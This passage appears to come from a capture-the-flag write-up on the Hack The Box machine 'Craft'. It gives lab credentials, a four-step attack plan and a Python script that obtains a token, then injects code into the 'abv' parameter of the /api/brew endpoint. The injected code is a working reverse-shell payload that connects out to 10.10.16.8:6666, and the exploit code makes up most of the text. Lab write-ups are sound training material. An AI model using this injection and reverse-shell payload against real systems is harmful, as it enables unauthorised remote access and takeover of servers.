
- username: dinesh
- password: 4aUh0A8PbVJxgd

Given our attack surface, the plan is the following:

1. Use given credentials to create a valid jwt.
2. With this token access the functionality that is weak to code injection.  This is at endpoint `/api/brew` with post parameter abv. Token must be sent in header `'X-Craft-Api-Token'`
3. Inject python code in order to obtain a reverse shell
4. win :)

For this reason i developed the following script which should launch a shell in the computer:

```python
import requests
import json
import random

identity = ('dinesh', '4aUh0A8PbVJxgd')

token_response = requests.get('https://api.craft.htb/api/auth/login', auth=identity, verify = False)
token = json.loads(token_response.text)['token']

code = "exec(\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.8',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\")"

data = {
  "id": random.randint(0,2 ** 32 - 1),
  "brewer": "string",
  "name": "string",
  "style": "string",
  "abv": code
}

answer = requests.post('https://api.craft.htb/api/brew/', data = json.dumps(data), headers={'X-Craft-Api-Token':token, "Content-Type": "application/json"}, verify= False)
print('Command ' + code + ' got answer ' + str(answer.status_code))
print(answer.text)
```

Now we are [[root???? ]]